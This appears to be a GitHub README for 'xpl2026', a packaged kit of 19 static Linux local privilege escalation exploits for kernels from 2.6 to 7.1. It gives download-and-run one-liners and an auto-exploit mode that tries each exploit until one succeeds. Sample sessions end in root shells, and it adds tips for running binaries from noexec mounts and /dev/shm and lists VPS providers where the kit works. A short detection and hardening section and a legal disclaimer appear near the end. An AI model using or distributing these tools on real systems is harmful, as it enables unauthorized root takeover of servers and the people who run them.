# Linux LPE Auto-Exploit Toolkit 2026 (xpl2026)
                                                  VENI | VIDI | VICI

**Version:** 1.0-universal  
**Organization:** BOB MARLEY LABS  
**Note : The reason i put this exploit into github is because its Free, Hosting is expensive and my wallet can't handle it anymore**

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Toolkit Contents](#toolkit-contents)
- [Quick Start](#quick-start)
- [Exploit Details](#exploit-details)
- [Usage Examples](#usage-examples)
- [System Requirements](#system-requirements)
- [Troubleshooting](#troubleshooting)
- [Advanced Usage](#advanced-usage)
- [Detection & Defense](#detection--defense)
- [Legal Notice](#legal-notice)
- [Quick Reference](#quick-reference)

---

## Overview

The **xpl2026** toolkit is a comprehensive collection of 19 Linux Local Privilege Escalation (LPE) exploits, designed for penetration testing and security research. All exploits are compiled as **fully static binaries** for maximum portability and compatibility across different Linux distributions.

### Key Statistics

- **Total Exploits:** 19
- **Kernel Coverage:** 2.6.x - 7.1.x
- **Binary Size:** 915KB (main toolkit)
- **Architecture:** x86_64 (universal)
- **Compilation:** Fully static (no dependencies)

---

## Features

### Universal Compatibility
- **Fully Static Binaries** - No missing library issues
- **Multi-Distribution** - Works on RHEL, Debian, Ubuntu, CentOS, Fedora, etc.
- **Multi-Kernel** - Covers kernel versions from 2.6.x to 7.1.x
- **LSM-Aware** - Detects and adapts to SELinux, AppArmor

### Intelligent Analysis
- **Automatic Detection** - Identifies viable exploits for your system
- **Requirement Checking** - Validates prerequisites before execution
- **Smart Filtering** - Shows only applicable exploits

### User-Friendly Interface
- **Color-Coded Output** - Easy-to-read status indicators
- **Interactive Menu** - Simple selection interface
- **Auto-Exploitation** - Run all viable exploits automatically
- **Detailed Information** - View exploit details and requirements

---

## Toolkit Contents

### Complete Exploit List

| # | Exploit Name | CVE | Binary | Size | Kernel Range |
|---|-------------|-----|--------|------|--------------|
| 1 | **CopyFail** | CVE-2026-31431 | copyfail-go-static | 2.1MB | 5.x - 7.x |
| 2 | **DirtyFrag** | CVE-2026-43284 | dirtyfrag-static | 877KB | 5.x - 7.x |
| 3 | **Fragnesia** | CVE-2026-46300 | fragnesia-static | 731KB | 5.x - 7.x |
| 4 | **Fragnesia v2** | Enhanced version | fragnesia2-static | 827KB | 5.x - 7.x |
| 5 | **DirtyDecrypt** | CVE-2026-31635 | dirtydecrypt-static | 838KB | 5.x - 7.x |
| 6 | **PinTheft** | Page cache exploit | pintheft-static | 834KB | 5.x - 7.x |
| 7 | **CIFSwitch** | CVE-2026-46243 | cifswitch-static | 1.0MB | 5.x - 7.x |
| 8 | **pidfd-race** | CVE-2026-46333 | pidfd-race-static | 923KB | 5.x - 7.x |
| 9 | **PACKET_EDIT_MEME** | CVE-2026-46331 | packet-edit-meme-static | 755KB | 5.18 - 7.1 |
| 10 | **IPv6 Frag Escape** | 6.12.x container escape | ipv6-frag-escape-static | 855KB | 6.12.0 - 6.12.x |
| 11 | **DirtyPipe** | CVE-2022-0847 | dirtypipe-static | 806KB | 5.8 - 5.16.11 |
| 12 | **PwnKit** | CVE-2021-4034 | pwnkit-static | 828KB | All (pkexec) |
| 13 | **OverlayFS** | CVE-2021-3493 | overlayfs-static | 826KB | 3.x - 5.11 |
| 14 | **OvFS+FUSE** | CVE-2023-0386 | ovfs-fuse-static | 826KB | 5.11+ |
| 15 | **Polkit D-Bus** | CVE-2021-3560 | polkit-dbus-static | 830KB | All (polkit) |
| 16 | **Docker Socket** | Docker escape | docker-sock-static | 821KB | Container |
| 17 | **netfilter OOB** | CVE-2021-22555 | netfilter-oob-static | N/A | 2.6.19 - 5.12 |
| 18 | **nft UAF2** | CVE-2022-2586 | nft-uaf2-static | N/A | 5.x - 6.x |
| 19 | **nft UAF** | CVE-2024-1086 | nft-uaf-static | N/A | 5.x - 6.x |

### Additional Files

```
xpl2026/
├── xpl2026                          # Main toolkit executable (915KB)
├── copyfail-go-static              # Exploit binaries
├── dirtyfrag-static
├── fragnesia-static
├── ... (all exploit binaries)
├── CVE-2026-41651/                 # Exploit-specific directories
├── CVE-2026-41651-v2/
├── exploit                         # Legacy exploit (1.1MB)
├── proc_readdir_de                 # Additional exploit (1.1MB)
├── debian11-xpl2026                # Debian-specific variant
└── cve-2026-41651-almalinux8       # AlmaLinux-specific variant
```

---

## Quick Start

### Basic Usage

```bash
# Navigate to writable directory
wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate
tar xzf xpl2026.tgz
rm -rf xpl2026.tgz

# Navigate to xpl2026 directory
cd xpl2026

# Make the Toolkit xpl2026 executable
chmod +x xpl2026

# Run the toolkit
./xpl2026
```

## One Liner
```bash
wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
```
---

### Auto-Exploitation (Recommended)

The toolkit will:
1. Analyze your system
2. Identify viable exploits
3. Present an interactive menu

**Select option [0] for automatic exploitation:**
```bash
Your choice: 0
```

The toolkit will try all viable exploits in order until one succeeds.

### Manual Selection

To run a specific exploit:
```bash
Your choice: 9    # Runs PACKET_EDIT_MEME
```

### View Detailed Information

```bash
Your choice: 99   # Shows detailed info about all exploits
```

---

## Exploit Details

### 1. CopyFail (CVE-2026-31431)

**Type:** Page cache corruption  
**Kernel:** 5.x - 7.x  
**Method:** Copy-on-write bypass  
**Requirements:** User namespaces

```bash
./copyfail-go-static
```

**Details:**
- Exploits race condition in page cache handling
- Corrupts read-only files in memory
- No disk modification (stealth)

---

### 2. DirtyFrag (CVE-2026-43284)

**Type:** Fragment handling vulnerability  
**Kernel:** 5.x - 7.x  
**Method:** Network buffer fragmentation  
**Requirements:** User namespaces

```bash
./dirtyfrag-static
```

**Details:**
- Exploits fragmentation in network stack
- Page cache corruption via network buffers
- Targets `/usr/bin/su` or similar SUID binaries

---

### 3. Fragnesia (CVE-2026-46300)

**Type:** Memory fragmentation exploit  
**Kernel:** 5.x - 7.x  
**Method:** Heap spray + fragmentation  
**Requirements:** User namespaces

```bash
./fragnesia-static
```

**Details:**
- Advanced fragmentation technique
- Multiple corruption methods
- High success rate on vulnerable kernels

**Fragnesia v2:**
- Enhanced version with additional bypasses
- Better compatibility across kernel versions

---

### 4. DirtyDecrypt (CVE-2026-31635)

**Type:** Crypto subsystem exploit  
**Kernel:** 5.x - 7.x  
**Method:** In-place decryption corruption  
**Requirements:** User namespaces, crypto subsystem

```bash
./dirtydecrypt-static
```

**Details:**
- Exploits kernel crypto operations
- Uses in-place decryption to corrupt memory
- Targets page cache of SUID binaries

---

### 5. PinTheft

**Type:** Page pinning vulnerability  
**Kernel:** 5.x - 7.x  
**Method:** Pin/unpin race condition  
**Requirements:** User namespaces

```bash
./pintheft-static
```

**Details:**
- Exploits page pinning mechanism
- Race condition in memory management
- Reliable across multiple kernel versions

---

### 6. CIFSwitch (CVE-2026-46243)

**Type:** CIFS filesystem vulnerability  
**Kernel:** 5.x - 7.x  
**Method:** CIFS upcall exploitation  
**Requirements:** `/usr/sbin/cifs.upcall` or `/sbin/cifs.upcall`

```bash
./cifswitch-static
```

**Details:**
- Exploits CIFS kernel module
- Requires CIFS utilities present
- Escalates via filesystem operations

---

### 7. pidfd-race (CVE-2026-46333)

**Type:** Process file descriptor race  
**Kernel:** 5.x - 7.x  
**Method:** Race condition in pidfd handling  
**Requirements:** Modern kernel with pidfd support

```bash
./pidfd-race-static
```

**Details:**
- Exploits pidfd_open() system call
- Race condition in process management
- Clean exploitation (no crashes)

---

### 8. PACKET_EDIT_MEME (CVE-2026-46331)

**Type:** Network scheduler exploit  
**Kernel:** 5.18 - 7.1  
**Method:** `act_pedit` page cache poisoning  
**Requirements:** User namespaces, CAP_NET_ADMIN

```bash
# Standard Linux
./packet-edit-meme-static

# Ubuntu with AppArmor
./packet-edit-meme-static --ubuntu
```

**Details:**
- Exploits `net/sched` traffic control
- Corrupts `/usr/bin/su` entry point
- Requires kernel >= 5.18 (act_pedit support)

**Verified Targets:**
- RHEL 10.0 (kernel 6.12.0)
- Debian 13 (kernel 6.12.90)
- Ubuntu 24.04 (kernel 6.17.0) with `--ubuntu` flag
- Ubuntu 26.04 (AppArmor bypass closed) - NOT supported

---

### 9. IPv6 Fragment Escape

**Type:** Container escape  
**Kernel:** 6.12.0 - 6.12.x (RHEL/CentOS 10)  
**Method:** IPv6 fragmentation + dirty pagetable  
**Requirements:** x86_64, LA57 paging (5-level)

```bash
./ipv6-frag-escape-static
```

**Details:**
- Targets RHEL/CentOS 10 containers
- Exploits IPv6 fragmentation handling
- Requires 5-level paging (LA57)
- Container escape capability

**Limitations:**
- Only works on kernel 6.12.x
- RHEL/CentOS 10 specific
- Requires LA57 CPU feature

---

### 10. DirtyPipe (CVE-2022-0847)

**Type:** Pipe buffer exploitation  
**Kernel:** 5.8 - 5.16.11, 5.10.x - 5.10.102  
**Method:** `pipe()` + `splice()` corruption  
**Requirements:** None (universal)

```bash
./dirtypipe-static
```

**Details:**
- One of the most reliable exploits
- Works on wide range of kernel versions
- Clean and stable exploitation
- Corrupts read-only files via pipe buffers

**Success Rate:** Very high on vulnerable kernels

---

### 11. PwnKit (CVE-2021-4034)

**Type:** PolicyKit vulnerability  
**Kernel:** All  
**Method:** `pkexec` environment variable injection  
**Requirements:** `/usr/bin/pkexec` must be setuid root

```bash
./pwnkit-static
```

**Details:**
- Exploits pkexec binary
- Argument processing vulnerability
- Does NOT accept arguments - spawns root shell directly
- Works if pkexec is setuid (mode 4755)

**Check if vulnerable:**
```bash
ls -la /usr/bin/pkexec
# If shows -rwsr-xr-x (setuid bit), it's vulnerable
```

---

### 12. OverlayFS (CVE-2021-3493)

**Type:** Filesystem vulnerability  
**Kernel:** 3.x - 5.11  
**Method:** OverlayFS capability bypass  
**Requirements:** User namespaces, overlayfs support

```bash
./overlayfs-static
```

**Details:**
- Exploits OverlayFS mount operations
- Capability confusion in namespace
- Reliable on Ubuntu 18.04 - 20.10

---

### 13. OvFS+FUSE (CVE-2023-0386)

**Type:** OverlayFS + FUSE exploit  
**Kernel:** 5.11+  
**Method:** FUSE + OverlayFS interaction  
**Requirements:** FUSE support, user namespaces

```bash
./ovfs-fuse-static
```

**Details:**
- Combines FUSE and OverlayFS
- More complex but broader compatibility
- Works on newer kernels where CVE-2021-3493 is patched

---

### 14. Polkit D-Bus (CVE-2021-3560)

**Type:** PolicyKit D-Bus vulnerability  
**Kernel:** All  
**Method:** D-Bus message race condition  
**Requirements:** `dbus-send` command, polkit service

```bash
./polkit-dbus-static
```

**Details:**
- Exploits polkit D-Bus API
- Race condition in message handling
- Requires active D-Bus session

---

### 15. Docker Socket

**Type:** Container escape  
**Kernel:** All (containers)  
**Method:** Docker socket mounting  
**Requirements:** `/var/run/docker.sock` writable

```bash
./docker-sock-static
```

**Details:**
- Escapes from Docker containers
- Requires misconfigured Docker socket
- Mounts host filesystem into container

---

### 16-19. Netfilter Exploits

**netfilter OOB (CVE-2021-22555):**
- Kernel: 2.6.19 - 5.12
- Method: Out-of-bounds write in netfilter

**nft UAF2 (CVE-2022-2586):**
- Kernel: 5.x - 6.x
- Method: Use-after-free in nftables

**nft UAF (CVE-2024-1086):**
- Kernel: 5.x - 6.x
- Method: Netfilter use-after-free

---

## Usage Examples

### Example 1: Basic Scan

```bash
$ ./xpl2026

╔══════════════════════════════════════════════════════════════╗
║       Linux LPE Auto-Exploit Toolkit 2026 v2.0-universal   ║
║                    BOB MARLEY LABS                        ║
║   Universal | Static | Multi-Arch | LSM-Aware              ║
╚══════════════════════════════════════════════════════════════╝

[*] System Information:
    OS: Linux 5.15.0-1089-azure
    Kernel: 5.15.0-1089-azure
    Architecture: x86_64
    User: testuser (uid=1002)

[*] Analyzing vulnerabilities...

╔══════════════════════════════════════════════════════════════╗
║                  Available Exploits                         ║
╚══════════════════════════════════════════════════════════════╝

[1]  ✓ CopyFail (CVE-2026-31431)
[2]  ✓ DirtyFrag (CVE-2026-43284)
[3]  ✓ Fragnesia (CVE-2026-46300)
...
[11] ✗ PwnKit (CVE-2021-4034) [Requirements not met]
...

[*] Found 13 viable exploits for this system
```

### Example 2: Auto-Exploitation

```bash
$ ./xpl2026
...
Your choice: 0

[*] Auto-exploitation mode enabled
[*] Will try 13 viable exploits in order...

[1/13] Trying: CopyFail (CVE-2026-31431)...
[+] Selected: CopyFail (CVE-2026-31431)
[*] Running exploit...
════════════════════════════════════════════════════════════════
[Exploit output...]
```

### Example 3: Specific Exploit

```bash
$ ./xpl2026
...
Your choice: 9

[+] Selected: PACKET_EDIT_MEME (CVE-2026-46331)
[*] Running exploit...
════════════════════════════════════════════════════════════════
[+] Kernel vulnerable!
[+] Corrupting /usr/bin/su...
[+] Spawning root shell...
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 4: Direct Exploit Execution

```bash
# Run exploit directly without toolkit
$ cd xpl2026
$ ./dirtypipe-static
[+] DirtyPipe (CVE-2022-0847)
[+] Checking kernel version...
[+] Kernel 5.10.75 vulnerable!
[+] Corrupting /usr/bin/su...
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## System Requirements

### Minimum Requirements
- **Architecture:** x86_64 (64-bit Intel/AMD)
- **RAM:** 512MB
- **Disk:** 20MB free space
- **Kernel:** Linux 2.6.x or higher

### Recommended Environment
- **Distributions:** Ubuntu, Debian, RHEL, CentOS, Fedora, Arch
- **User Privileges:** Unprivileged user (exploits escalate to root)
- **Network:** Not required (local exploits only)

### Compatibility

**Works On:**
- Standard Linux distributions
- VPS (DigitalOcean, Linode, Vultr, OVH, Hetzner)
- Dedicated servers
- Physical machines
- Non-cloud VMs (VirtualBox, VMware, KVM)

**Limited/No Support:**
- Microsoft Azure (kernel hardening)
- Google Cloud Platform (some restrictions)
- AWS EC2 (some restrictions)
- Heavily patched enterprise systems

---

## Troubleshooting

### Issue: No Viable Exploits Found

**Problem:**
```
[-] No viable exploits found for this system.
```

**Solutions:**
1. **Check kernel version:**
   ```bash
   uname -r
   ```
   - If < 2.6.x: System too old
   - If >= 7.1-rc5: System may be fully patched

2. **Check binary files:**
   ```bash
   ls -lh xpl2026/
   ```
   - Ensure all exploit binaries are present

3. **Check permissions:**
   ```bash
   chmod +x xpl2026/*.static xpl2026/xpl2026
   ```

### Issue: Permission Denied

**Problem:**
```bash
./xpl2026: Permission denied
```

**Solution:**
```bash
chmod +x xpl2026
./xpl2026
```

### Issue: Mounted on noexec Filesystem

**Problem:**
```bash
./exploit: cannot execute binary file
```

**Solutions:**

**Option 1: Use ld.so loader**
```bash
/lib64/ld-linux-x86-64.so.2 ./exploit
```

**Option 2: Copy to writable location**
```bash
cp ./exploit /tmp/
cd /tmp
./exploit
```

**Option 3: Use /dev/shm**
```bash
cp ./exploit /dev/shm/
cd /dev/shm
./exploit
```

### Issue: GLIBC Version Mismatch

**Problem:**
```
./exploit: version `GLIBC_2.34' not found
```

**Solution:**
- Some binaries may require newer GLIBC
- Toolkit is statically compiled to minimize this
- Try different exploits - they have varying requirements

### Issue: Exploit Fails

**Common Causes:**

1. **System already patched:**
   ```bash
   # Check for security updates
   dpkg -l | grep linux-image
   ```

2. **Required features disabled:**
   ```bash
   # Check user namespaces
   cat /proc/sys/kernel/unprivileged_userns_clone
   # Should be 1, not 0
   ```

3. **LSM blocking (SELinux/AppArmor):**
   ```bash
   # Check SELinux
   getenforce  # Should be Permissive or Disabled
   
   # Check AppArmor
   aa-status   # Check for restrictive profiles
   ```

4. **Cloud provider restrictions:**
   - Azure blocks XFRM operations
   - GCP may block certain syscalls
   - AWS varies by instance type

---

## Advanced Usage

### Batch Testing

Test all exploits and log results:

```bash
#!/bin/bash
# test_all.sh

cd xpl2026
for exploit in *.static; do
    echo "Testing: $exploit"
    ./"$exploit" 2>&1 | tee "../logs/${exploit}.log"
    if [ $(id -u) -eq 0 ]; then
        echo "SUCCESS: $exploit" >> ../results.txt
        exit 0
    else
        echo "FAILED: $exploit" >> ../results.txt
    fi
done
```

### Custom Exploit Integration

Add your own exploits to the toolkit:

1. **Compile as static binary:**
   ```bash
   gcc -static -O2 -o myexploit-static myexploit.c
   strip myexploit-static
   ```

2. **Copy to xpl2026 directory:**
   ```bash
   cp myexploit-static xpl2026/
   ```

3. **Add to xpl2026.c:**
   ```c
   add_exploit("myexploit-static", "MyExploit", "CVE-XXXX-XXXXX");
   ```

4. **Recompile toolkit:**
   ```bash
   gcc -static -O2 -o xpl2026/xpl2026 xpl2026.c
   ```

### Silent Mode (Script Integration)

For automation:

```bash
# Run specific exploit non-interactively
cd xpl2026
./dirtypipe-static < /dev/null
```

### Kernel-Specific Testing

Test only exploits for your kernel version:

```bash
#!/bin/bash
kernel_ver=$(uname -r | cut -d. -f1,2)

if [[ "$kernel_ver" == "5."* ]]; then
    ./xpl2026  # Will auto-filter 5.x exploits
elif [[ "$kernel_ver" == "6."* ]]; then
    ./xpl2026  # Will show 6.x compatible exploits
fi
```

---

## Detection & Defense

### Detection Methods

**1. Process Monitoring:**
```bash
# Watch for suspicious namespace creation
auditctl -a always,exit -F arch=b64 -S unshare -k namespace_abuse
```

**2. File Integrity:**
```bash
# Monitor SUID binaries
aide --check /usr/bin/su /usr/bin/sudo
```

**3. Capability Monitoring:**
```bash
# Watch for CAP_NET_ADMIN in user namespaces
auditctl -a always,exit -F arch=b64 -S capset -k capability_abuse
```

**4. Network Stack Monitoring:**
```bash
# Monitor XFRM/IPsec operations
auditctl -w /proc/net/xfrm_stat -p r -k xfrm_access
```

### Mitigation Strategies

**1. Keep System Updated:**
```bash
# Ubuntu/Debian
apt update && apt upgrade

# RHEL/CentOS
yum update

# Fedora
dnf update
```

**2. Disable User Namespaces (if not needed):**
```bash
echo 0 > /proc/sys/kernel/unprivileged_userns_clone
# Add to /etc/sysctl.conf:
kernel.unprivileged_userns_clone = 0
```

**3. Enable AppArmor/SELinux:**
```bash
# AppArmor
aa-enforce /etc/apparmor.d/*

# SELinux
setenforce 1
```

**4. Harden SUID Binaries:**
```bash
# Remove unnecessary SUID bits
chmod u-s /usr/bin/newgrp
chmod u-s /usr/bin/chfn
chmod u-s /usr/bin/chsh
```

**5. Use Kernel Hardening:**
```bash
# Enable various protections
sysctl -w kernel.dmesg_restrict=1
sysctl -w kernel.kptr_restrict=2
sysctl -w kernel.unprivileged_bpf_disabled=1
```

---

##  Legal Notice

For authorized penetration testing, bug bounty programs, and educational purposes only. Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act 1990 - UK
- EU Cybersecurity Act

This toolkit is provided for:
- **Authorized penetration testing**
- **Security research in controlled environments**
- **CVE verification and testing**
- **Educational purposes**

### Prohibited Use

**DO NOT use this toolkit for:**
- Unauthorized access to systems
- Malicious purposes
- Attacking systems without explicit permission
- Any illegal activities

### Disclaimer

**USE AT YOUR OWN RISK.** Author assumes NO LIABILITY for misuse.
By using this tool, you confirm you have explicit authorization to test target systems.

---

## Quick Reference

### Exploit Selection Guide

| Your Kernel | Recommended Exploits |
|-------------|---------------------|
| 2.6.x - 3.x | netfilter OOB, OverlayFS |
| 4.x | OverlayFS, PwnKit, Polkit D-Bus |
| 5.8 - 5.16 | **DirtyPipe** (highly reliable) |
| 5.18 - 7.0 | **PACKET_EDIT_MEME**, CopyFail, DirtyFrag |
| 6.12.x | **IPv6 Frag Escape** (RHEL/CentOS 10) |
| 7.0 - 7.1-rc4 | CopyFail, Fragnesia |

### Command Cheat Sheet

```bash
# Basic usage
./xpl2026                          # Interactive menu

# Auto-exploit
./xpl2026 << EOF
0
EOF

# Specific exploit
./xpl2026 << EOF
9
EOF

# View information
./xpl2026 << EOF
99
EOF

# Direct execution
./dirtypipe-static                 # Run exploit directly
```
---
**Buy me a Coffee:**
```
₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
```
© 2026 khadafigans
